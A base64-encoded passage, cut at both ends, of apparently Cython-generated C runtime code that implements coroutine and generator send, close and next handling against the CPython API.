m1pbmF0ZWRFcnJvcigoUHlPYmplY3QqKXNlbGYsIHZhbHVlLCBjbG9zaW5nKTtcbiAgICAgICAgcmV0dXJuIFBZR0VOX0VSUk9SO1xuICAgIH1cbiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIHRzdGF0ZSA9IF9fcHl4X3RzdGF0ZTtcbiNlbHNlXG4gICAgdHN0YXRlID0gX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50O1xuI2VuZGlmXG4gICAgZXhjX3N0YXRlID0gJnNlbGYtPmdpX2V4Y19zdGF0ZTtcbiAgICBpZiAoZXhjX3N0YXRlLT5leGNfdmFsdWUpIHtcbiAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG4gICAgICAgICNlbHNlXG4gICAgICAgIFB5T2JqZWN0ICpleGNfdGI7XG4gICAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0ICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiAgICAgICAgZXhjX3RiID0gUHlFeGNlcHRpb25fR2V0VHJhY2ViYWNrKGV4Y19zdGF0ZS0+ZXhjX3ZhbHVlKTtcbiAgICAgICAgI2VsaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNFxuICAgICAgICBleGNfdGIgPSAoKFB5QmFzZUV4Y2VwdGlvbk9iamVjdCopIGV4Y19zdGF0ZS0+ZXhjX3ZhbHVlKS0+dHJhY2ViYWNrO1xuICAgICAgICAjZWxzZVxuICAgICAgICBleGNfdGIgPSBleGNfc3RhdGUtPmV4Y190cmFjZWJhY2s7XG4gICAgICAgICNlbmRpZlxuICAgICAgICBpZiAoZXhjX3RiKSB7XG4gICAgICAgICAgICBQeVRyYWNlYmFja09iamVjdCAqdGIgPSAoUHlUcmFjZWJhY2tPYmplY3QgKikgZXhjX3RiO1xuICAgICAgICAgICAgUHlGcmFtZU9iamVjdCAqZiA9IHRiLT50Yl9mcmFtZTtcbiAgICAgICAgICAgIGFzc2VydChmLT5mX2JhY2sgPT0gTlVMTCk7XG4gICAgICAgICAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBBMVxuICAgICAgICAgICAgZi0+Zl9iYWNrID0gUHlUaHJlYWRTdGF0ZV9HZXRGcmFtZSh0c3RhdGUpO1xuICAgICAgICAgICAgI2Vsc2VcbiAgICAgICAgICAgIFB5X1hJTkNSRUYodHN0YXRlLT5mcmFtZSk7XG4gICAgICAgICAgICBmLT5mX2JhY2sgPSB0c3RhdGUtPmZyYW1lO1xuICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICAgICAgICAgICBQeV9ERUNSRUYoZXhjX3RiKTtcbiAgICAgICAgICAgICNlbmRpZlxuICAgICAgICB9XG4gICAgICAgICNlbmRpZlxuICAgIH1cbiNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4gICAgZXhjX3N0YXRlLT5wcmV2aW91c19pdGVtID0gdHN0YXRlLT5leGNfaW5mbztcbiAgICB0c3RhdGUtPmV4Y19pbmZvID0gZXhjX3N0YXRlO1xuI2Vsc2VcbiAgICBpZiAoZXhjX3N0YXRlLT5leGNfdHlwZSkge1xuICAgICAgICBfX1B5eF9FeGNlcHRpb25Td2FwKCZleGNfc3RhdGUtPmV4Y190eXBlLCAmZXhjX3N0YXRlLT5leGNfdmFsdWUsICZleGNfc3RhdGUtPmV4Y190cmFjZWJhY2spO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIF9fUHl4X0Nvcm91dGluZV9FeGNlcHRpb25DbGVhcihleGNfc3RhdGUpO1xuICAgICAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZleGNfc3RhdGUtPmV4Y190eXBlLCAmZXhjX3N0YXRlLT5leGNfdmFsdWUsICZleGNfc3RhdGUtPmV4Y190cmFjZWJhY2spO1xuICAgIH1cbiNlbmRpZlxuICAgIHJldHZhbCA9IHNlbGYtPmJvZHkoc2VsZiwgdHN0YXRlLCB2YWx1ZSk7XG4jaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDS1xuICAgIGV4Y19zdGF0ZSA9ICZzZWxmLT5naV9leGNfc3RhdGU7XG4gICAgdHN0YXRlLT5leGNfaW5mbyA9IGV4Y19zdGF0ZS0+cHJldmlvdXNfaXRlbTtcbiAgICBleGNfc3RhdGUtPnByZXZpb3VzX2l0ZW0gPSBOVUxMO1xuICAgIF9fUHl4X0Nvcm91dGluZV9SZXNldEZyYW1lQmFja3BvaW50ZXIoZXhjX3N0YXRlKTtcbiNlbmRpZlxuICAgICpyZXN1bHQgPSByZXR2YWw7XG4gICAgaWYgKHNlbGYtPnJlc3VtZV9sYWJlbCA9PSAtMSkge1xuICAgICAgICByZXR1cm4gbGlrZWx5KHJldHZhbCkgPyBQWUdFTl9SRVRVUk4gOiBQWUdFTl9FUlJPUjtcbiAgICB9XG4gICAgcmV0dXJuIFBZR0VOX05FWFQ7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0Nvcm91dGluZV9SZXNldEZyYW1lQmFja3BvaW50ZXIoX19QeXhfRXhjSW5mb1N0cnVjdCAqZXhjX3N0YXRlKSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihleGNfc3RhdGUpO1xuI2Vsc2VcbiAgICBQeU9iamVjdCAqZXhjX3RiO1xuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0XG4gICAgaWYgKCFleGNfc3RhdGUtPmV4Y192YWx1ZSkgcmV0dXJuO1xuICAgIGV4Y190YiA9IFB5RXhjZXB0aW9uX0dldFRyYWNlYmFjayhleGNfc3RhdGUtPmV4Y192YWx1ZSk7XG4gICAgI2Vsc2VcbiAgICBleGNfdGIgPSBleGNfc3RhdGUtPmV4Y190cmFjZWJhY2s7XG4gICAgI2VuZGlmXG4gICAgaWYgKGxpa2VseShleGNfdGIpKSB7XG4gICAgICAgIFB5VHJhY2ViYWNrT2JqZWN0ICp0YiA9IChQeVRyYWNlYmFja09iamVjdCAqKSBleGNfdGI7XG4gICAgICAgIFB5RnJhbWVPYmplY3QgKmYgPSB0Yi0+dGJfZnJhbWU7XG4gICAgICAgIFB5X0NMRUFSKGYtPmZfYmFjayk7XG4gICAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0XG4gICAgICAgIFB5X0RFQ1JFRihleGNfdGIpO1xuICAgICAgICAjZW5kaWZcbiAgICB9XG4jZW5kaWZcbn1cbiNkZWZpbmUgX19QeXhfQ29yb3V0aW5lX01ldGhvZFJldHVybkZyb21SZXN1bHQoZ2VuLCByZXN1bHQsIHJldHZhbCwgaXRlcm5leHQpXFxcbiAgICAoKHJlc3VsdCkgPT0gUFlHRU5fTkVYVCA/IChyZXR2YWwpIDogX19QeXhfX0Nvcm91dGluZV9NZXRob2RSZXR1cm5Gcm9tUmVzdWx0KGdlbiwgcmVzdWx0LCByZXR2YWwsIGl0ZXJuZXh0KSlcbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9fQ29yb3V0aW5lX01ldGhvZFJldHVybkZyb21SZXN1bHQoUHlPYmplY3QqIGdlbiwgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdCwgUHlPYmplY3QgKnJldHZhbCwgaW50IGl0ZXJuZXh0KSB7XG4gICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoZ2VuKTtcbiAgICBpZiAobGlrZWx5KHJlc3VsdCA9PSBQWUdFTl9SRVRVUk4pKSB7XG4gICAgICAgIGludCBpc19hc3luYyA9IDA7XG4gICAgICAgICNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VEXG4gICAgICAgIGlzX2FzeW5jID0gX19QeXhfQXN5bmNHZW5fQ2hlY2tFeGFjdChnZW4pO1xuICAgICAgICAjZW5kaWZcbiAgICAgICAgX19QeXhfUmV0dXJuV2l0aFN0b3BJdGVyYXRpb24ocmV0dmFsLCBpc19hc3luYywgaXRlcm5leHQpO1xuICAgICAgICBQeV9YREVDUkVGKHJldHZhbCk7XG4gICAgfVxuICAgIHJldHVybiBOVUxMO1xufVxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuc3RhdGljIENZVEhPTl9JTkxJTkVcblB5T2JqZWN0ICpfX1B5eF9QeUdlbl9TZW5kKFB5R2VuT2JqZWN0ICpnZW4sIFB5T2JqZWN0ICphcmcpIHtcbiNpZiBQWV9WRVJTSU9OX0hFWCA8PSAweDAzMEEwMEExXG4gICAgcmV0dXJuIF9QeUdlbl9TZW5kKGdlbiwgYXJnKTtcbiNlbHNlXG4gICAgUHlPYmplY3QgKnJlc3VsdDtcbiAgICBpZiAoUHlJdGVyX1NlbmQoKFB5T2JqZWN0KilnZW4sIGFyZyA/IGFyZyA6IFB5X05vbmUsICZyZXN1bHQpID09IFBZR0VOX1JFVFVSTikge1xuICAgICAgICBpZiAoUHlBc3luY0dlbl9DaGVja0V4YWN0KGdlbikpIHtcbiAgICAgICAgICAgIGFzc2VydChyZXN1bHQgPT0gUHlfTm9uZSk7XG4gICAgICAgICAgICBQeUVycl9TZXROb25lKFB5RXhjX1N0b3BBc3luY0l0ZXJhdGlvbik7XG4gICAgICAgIH1cbiAgICAgICAgZWxzZSBpZiAocmVzdWx0ID09IFB5X05vbmUpIHtcbiAgICAgICAgICAgIFB5RXJyX1NldE5vbmUoUHlFeGNfU3RvcEl0ZXJhdGlvbik7XG4gICAgICAgIH1cbiAgICAgICAgZWxzZSB7XG4jaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGQwMEExXG4gICAgICAgICAgICBfUHlHZW5fU2V0U3RvcEl0ZXJhdGlvblZhbHVlKHJlc3VsdCk7XG4jZWxzZVxuICAgICAgICAgICAgaWYgKCFQeVR1cGxlX0NoZWNrKHJlc3VsdCkgJiYgIVB5RXhjZXB0aW9uSW5zdGFuY2VfQ2hlY2socmVzdWx0KSkge1xuICAgICAgICAgICAgICAgIFB5RXJyX1NldE9iamVjdChQeUV4Y19TdG9wSXRlcmF0aW9uLCByZXN1bHQpO1xuICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICBQeU9iamVjdCAqZXhjID0gX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZyhQeUV4Y19TdG9wSXRlcmF0aW9uLCByZXN1bHQpO1xuICAgICAgICAgICAgICAgIGlmIChsaWtlbHkoZXhjICE9IE5VTEwpKSB7XG4gICAgICAgICAgICAgICAgICAgIFB5RXJyX1NldE9iamVjdChQeUV4Y19TdG9wSXRlcmF0aW9uLCBleGMpO1xuICAgICAgICAgICAgICAgICAgICBQeV9ERUNSRUYoZXhjKTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4jZW5kaWZcbiAgICAgICAgfVxuICAgICAgICBQeV9ERUNSRUYocmVzdWx0KTtcbiAgICAgICAgcmVzdWx0ID0gTlVMTDtcbiAgICB9XG4gICAgcmV0dXJuIHJlc3VsdDtcbiNlbmRpZlxufVxuI2VuZGlmXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBfX1B5eF9QeVNlbmRSZXN1bHRcbl9fUHl4X0Nvcm91dGluZV9GaW5pc2hEZWxlZ2F0aW9uKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuLCBQeU9iamVjdCoqIHJldHZhbCkge1xuICAgIF9fUHl4X1B5U2VuZFJlc3VsdCByZXN1bHQ7XG4gICAgUHlPYmplY3QgKnZhbCA9IE5VTEw7XG4gICAgYXNzZXJ0KF9fUHl4X0Nvcm91dGluZV9nZXRfaXNfcnVubmluZyhnZW4pKTtcbiAgICBfX1B5eF9Db3JvdXRpbmVfVW5kZWxlZ2F0ZShnZW4pO1xuICAgIF9fUHl4X1B5R2VuX19GZXRjaFN0b3BJdGVyYXRpb25WYWx1ZShfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQsICZ2YWwpO1xuICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kRXgoZ2VuLCB2YWwsIHJldHZhbCwgMCk7XG4gICAgUHlfWERFQ1JFRih2YWwpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG4jaWYgQ1lUSE9OX1VTRV9BTV9TRU5EXG5zdGF0aWMgX19QeXhfUHlTZW5kUmVzdWx0XG5fX1B5eF9Db3JvdXRpbmVfU2VuZFRvRGVsZWdhdGUoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4sIF9fUHl4X3B5aXRlcl9zZW5kZnVuYyBnZW5fYW1fc2VuZCwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqKnJldHZhbCkge1xuICAgIFB5T2JqZWN0ICpyZXQgPSBOVUxMO1xuICAgIF9fUHl4X1B5U2VuZFJlc3VsdCBkZWxlZ2F0ZV9yZXN1bHQsIHJlc3VsdDtcbiAgICBhc3NlcnQoX19QeXhfQ29yb3V0aW5lX2dldF9pc19ydW5uaW5nKGdlbikpO1xuICAgIGRlbGVnYXRlX3Jlc3VsdCA9IGdlbl9hbV9zZW5kKGdlbi0+eWllbGRmcm9tLCB2YWx1ZSwgJnJldCk7XG4gICAgaWYgKGRlbGVnYXRlX3Jlc3VsdCA9PSBQWUdFTl9ORVhUKSB7XG4gICAgICAgIGFzc2VydCAocmV0ICE9IE5VTEwpO1xuICAgICAgICAqcmV0dmFsID0gcmV0O1xuICAgICAgICByZXR1cm4gUFlHRU5fTkVYVDtcbiAgICB9XG4gICAgYXNzZXJ0IChkZWxlZ2F0ZV9yZXN1bHQgIT0gUFlHRU5fRVJST1IgfHwgcmV0ID09IE5VTEwpO1xuICAgIF9fUHl4X0Nvcm91dGluZV9VbmRlbGVnYXRlKGdlbik7XG4gICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmRFeChnZW4sIHJldCwgcmV0dmFsLCAwKTtcbiAgICBQeV9YREVDUkVGKHJldCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbiNlbmRpZlxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Db3JvdXRpbmVfU2VuZChQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnZhbHVlKSB7XG4gICAgUHlPYmplY3QgKnJldHZhbCA9IE5VTEw7XG4gICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9BbVNlbmQoc2VsZiwgdmFsdWUsICZyZXR2YWwpO1xuICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfTWV0aG9kUmV0dXJuRnJvbVJlc3VsdChzZWxmLCByZXN1bHQsIHJldHZhbCwgMCk7XG59XG5zdGF0aWMgX19QeXhfUHlTZW5kUmVzdWx0XG5fX1B5eF9Db3JvdXRpbmVfQW1TZW5kKFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICoqcmV0dmFsKSB7XG4gICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdDtcbiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QqKSBzZWxmO1xuICAgIGlmICh1bmxpa2VseShfX1B5eF9Db3JvdXRpbmVfdGVzdF9hbmRfc2V0X2lzX3J1bm5pbmcoZ2VuKSkpIHtcbiAgICAgICAgKnJldHZhbCA9IF9fUHl4X0Nvcm91dGluZV9BbHJlYWR5UnVubmluZ0Vycm9yKGdlbik7XG4gICAgICAgIHJldHVybiBQWUdFTl9FUlJPUjtcbiAgICB9XG4gICAgI2lmIENZVEhPTl9VU0VfQU1fU0VORFxuICAgIGlmIChnZW4tPnlpZWxkZnJvbV9hbV9zZW5kKSB7XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kVG9EZWxlZ2F0ZShnZW4sIGdlbi0+eWllbGRmcm9tX2FtX3NlbmQsIHZhbHVlLCByZXR2YWwpO1xuICAgIH0gZWxzZVxuICAgICNlbmRpZlxuICAgIGlmIChnZW4tPnlpZWxkZnJvbSkge1xuICAgICAgICBQeU9iamVjdCAqeWYgPSBnZW4tPnlpZWxkZnJvbTtcbiAgICAgICAgUHlPYmplY3QgKnJldDtcbiAgICAgICNpZiAhQ1lUSE9OX1VTRV9BTV9TRU5EXG4gICAgICAgICNpZmRlZiBfX1B5eF9HZW5lcmF0b3JfVVNFRFxuICAgICAgICBpZiAoX19QeXhfR2VuZXJhdG9yX0NoZWNrRXhhY3QoeWYpKSB7XG4gICAgICAgICAgICByZXQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZCh5ZiwgdmFsdWUpO1xuICAgICAgICB9IGVsc2VcbiAgICAgICAgI2VuZGlmXG4gICAgICAgICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRFxuICAgICAgICBpZiAoX19QeXhfQ29yb3V0aW5lX0NoZWNrKHlmKSkge1xuICAgICAgICAgICAgcmV0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmQoeWYsIHZhbHVlKTtcbiAgICAgICAgfSBlbHNlXG4gICAgICAgICNlbmRpZlxuICAgICAgICAjaWZkZWYgX19QeXhfQXN5bmNHZW5fVVNFRFxuICAgICAgICBpZiAoX19weXhfUHlBc3luY0dlbkFTZW5kX0NoZWNrRXhhY3QoeWYpKSB7XG4gICAgICAgICAgICByZXQgPSBfX1B5eF9hc3luY19nZW5fYXNlbmRfc2VuZCh5ZiwgdmFsdWUpO1xuICAgICAgICB9IGVsc2VcbiAgICAgICAgI2VuZGlmXG4gICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiAgICAgICAgaWYgKFB5R2VuX0NoZWNrRXhhY3QoeWYpKSB7XG4gICAgICAgICAgICByZXQgPSBfX1B5eF9QeUdlbl9TZW5kKChQeUdlbk9iamVjdCopeWYsIHZhbHVlID09IFB5X05vbmUgPyBOVUxMIDogdmFsdWUpO1xuICAgICAgICB9IGVsc2VcbiAgICAgICAgaWYgKFB5Q29yb19DaGVja0V4YWN0KHlmKSkge1xuICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlHZW5fU2VuZCgoUHlHZW5PYmplY3QqKXlmLCB2YWx1ZSA9PSBQeV9Ob25lID8gTlVMTCA6IHZhbHVlKTtcbiAgICAgICAgfSBlbHNlXG4gICAgICAgICNlbmRpZlxuICAgICAgI2VuZGlmXG4gICAgICAgIHtcbiAgICAgICAgICAgICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwODAwMDBcbiAgICAgICAgICAgIGlmICh2YWx1ZSA9PSBQeV9Ob25lICYmIFB5SXRlcl9DaGVjayh5ZikpXG4gICAgICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlJdGVyX05leHRfUGxhaW4oeWYpO1xuICAgICAgICAgICAgZWxzZVxuICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDEoeWYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZW5kLCB2YWx1ZSk7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKGxpa2VseShyZXQpKSB7XG4gICAgICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pO1xuICAgICAgICAgICAgKnJldHZhbCA9IHJldDtcbiAgICAgICAgICAgIHJldHVybiBQWUdFTl9ORVhUO1xuICAgICAgICB9XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9GaW5pc2hEZWxlZ2F0aW9uKGdlbiwgcmV0dmFsKTtcbiAgICB9IGVsc2Uge1xuICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZEV4KGdlbiwgdmFsdWUsIHJldHZhbCwgMCk7XG4gICAgfVxuICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBpbnQgX19QeXhfQ29yb3V0aW5lX0Nsb3NlSXRlcihfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiwgUHlPYmplY3QgKnlmKSB7XG4gICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdDtcbiAgICBQeU9iamVjdCAqcmV0dmFsID0gTlVMTDtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihnZW4pO1xuICAgIGFzc2VydChfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmcoZ2VuKSk7XG4gICAgI2lmZGVmIF9fUHl4X0dlbmVyYXRvcl9VU0VEXG4gICAgaWYgKF9fUHl4X0dlbmVyYXRvcl9DaGVja0V4YWN0KHlmKSkge1xuICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfQ2xvc2UoeWYsICZyZXR2YWwpO1xuICAgIH0gZWxzZVxuICAgICNlbmRpZlxuICAgICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRFxuICAgIGlmIChfX1B5eF9Db3JvdXRpbmVfQ2hlY2soeWYpKSB7XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9DbG9zZSh5ZiwgJnJldHZhbCk7XG4gICAgfSBlbHNlXG4gICAgaWYgKF9fUHl4X0Nvcm91dGluZUF3YWl0X0NoZWNrRXhhY3QoeWYpKSB7XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZUF3YWl0X0Nsb3NlKChfX3B5eF9Db3JvdXRpbmVBd2FpdE9iamVjdCopeWYpO1xuICAgIH0gZWxzZVxuICAgICNlbmRpZlxuICAgICNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VEXG4gICAgaWYgKF9fcHl4X1B5QXN5bmNHZW5BU2VuZF9DaGVja0V4YWN0KHlmKSkge1xuICAgICAgICByZXR2YWwgPSBfX1B5eF9hc3luY19nZW5fYXNlbmRfY2xvc2UoeWYsIE5VTEwpO1xuICAgICAgICByZXN1bHQgPSBQWUdFTl9SRVRVUk47XG4gICAgfSBlbHNlXG4gICAgaWYgKF9fcHl4X1B5QXN5bmNHZW5BVGhyb3dfQ2hlY2tFeGFjdCh5ZikpIHtcbiAgICAgICAgcmV0dmFsID0gX19QeXhfYXN5bmNfZ2VuX2F0aHJvd19jbG9zZSh5ZiwgTlVMTCk7XG4gICAgICAgIHJlc3VsdCA9IFBZR0VOX1JFVFVSTjtcbiAgICB9IGVsc2VcbiAgICAjZW5kaWZcbiAgICB7XG4gICAgICAgIFB5T2JqZWN0ICptZXRoO1xuICAgICAgICByZXN1bHQgPSBQWUdFTl9SRVRVUk47XG4gICAgICAgIG1ldGggPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcih5ZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nsb3NlKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFtZXRoKSkge1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKSB7XG4gICAgICAgICAgICAgICAgUHlFcnJfV3JpdGVVbnJhaXNhYmxlKHlmKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIHJldHZhbCA9IF9fUHl4X1B5T2JqZWN0X0NhbGxOb0FyZyhtZXRoKTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihtZXRoKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghcmV0dmFsKSkge1xuICAgICAgICAgICAgICAgIHJlc3VsdCA9IFBZR0VOX0VSUk9SO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgfVxuICAgIFB5X1hERUNSRUYocmV0dmFsKTtcbiAgICByZXR1cm4gcmVzdWx0ID09IFBZR0VOX0VSUk9SID8gLTEgOiAwO1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZW5lcmF0b3JfTmV4dChQeU9iamVjdCAqc2VsZikge1xuICAgIF9fUHl4X1B5U2VuZFJlc3VsdCByZXN1bHQ7XG4gICAgUHlPYmplY3QgKnJldHZhbCA9IE5VTEw7XG4gICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSAoX19weXhfQ29yb3V0aW5lT2JqZWN0Kikgc2VsZjtcbiAgICBpZiAodW5saWtlbHkoX19QeXhfQ29yb3V0aW5lX3Rlc3RfYW5kX3NldF9pc19ydW5uaW5nKGdlbikpKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfQWxyZWFkeVJ1bm5pbmdFcnJvcihnZW4pO1xuICAgIH1cbiAgICAjaWYgQ1lUSE9OX1VTRV9BTV9TRU5EXG4gICAgaWYgKGdlbi0+eWllbGRmcm9tX2FtX3NlbmQpIHtcbiAgICAgICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmRUb0RlbGVnYXRlKGdlbiwgZ2VuLT55aWVsZGZyb21fYW1fc2VuZCwgUHlfTm9uZSwgJnJldHZhbCk7XG4gICAgfSBlbHNlXG4gICAgI2VuZGlmXG4gICAgaWYgKGdlbi0+eWllbGRmcm9tKSB7XG4gICAgICAgIFB5T2JqZWN0ICp5ZiA9IGdlbi0+eWllbGRmcm9tO1xuICAgICAgICBQeU9iamVjdCAqcmV0O1xuICAgICAgICAjaWZkZWYgX19QeXhfR2VuZXJhdG9yX1VTRURcbiAgICAgICAgaWYgKF9fUHl4X0dlbmVyYXRvcl9DaGVja0V4YWN0KHlmKSkge1xuICAgICAgICAgICAgcmV0ID0gX19QeXhfR2VuZXJhdG9yX05leHQoeWYpO1xuICAgICAgICB9IGVsc2VcbiAgICAgICAgI2VuZGlmXG4gICAgICAgICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRFxuICAgICAgICBpZiAoX19QeXhfQ29yb3V0aW5lX0NoZWNrRXhhY3QoeWYpKSB7XG4gICAgICAgICAgICByZXQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZCh5ZiwgUHlfTm9uZSk7XG4gICAgICAgIH0gZWxzZVxuICAgICAgICAjZW5kaWZcbiAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiAoUFlfVkVSU0lPTl9IRVggPCAweDAzMEEwMEEzIHx8ICFDWVRIT05fVVNFX0FNX1NFTkQpXG4gICAgICAgIGlmIChQeUdlbl9DaGVja0V4YWN0KHlmKSkge1xuICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlHZW5fU2VuZCgoUHlHZW5PYmplY3QqKXlmLCBOVUxMKTtcbiAgICAgICAgfSBlbHNlXG4gICAgICAgICNlbmRpZlxuICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlJdGVyX05leHRfUGxhaW4oeWYpO1xuICAgICAgICBpZiAobGlrZWx5KHJldCkpIHtcbiAgICAgICAgICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7XG4gICAgICAgICAgICByZXR1cm4gcmV0O1xuICAgICAgICB9XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9GaW5pc2hEZWxlZ2F0aW9uKGdlbiwgJnJldHZhbCk7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmRFeChnZW4sIFB5X05vbmUsICZyZXR2YWwsIDApO1xuICAgIH1cbiAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pO1xuICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfTWV0aG9kUmV0dXJuRnJvbVJlc3VsdChzZWxmLCByZXN1bHQsIHJldHZhbCwgMSk7XG59XG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0Nvcm91dGluZV9DbG9zZV9NZXRob2QoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICphcmcpIHtcbiAgICBQeU9iamVjdCAqcmV0dmFsID0gTlVMTDtcbiAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0O1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGFyZyk7XG4gICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX0Nsb3NlKHNlbGYsICZyZXR2YWwpO1xuICAgIGlmICh1bmxpa2VseShyZXN1bHQgPT0gUFlHRU5fRVJST1IpKVxuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICBQeV9YREVDUkVGKHJldHZhbCk7XG4gICAgUHlfUkVUVVJOX05PTkU7XG59XG5zdGF0aWMgX19QeXhfUHlTZW5kUmVzdWx0XG5fX1B5eF9Db3JvdXRpbmVfQ2xvc2UoUHlPYmplY3QgKnNlbGYsIFB5T2JqZ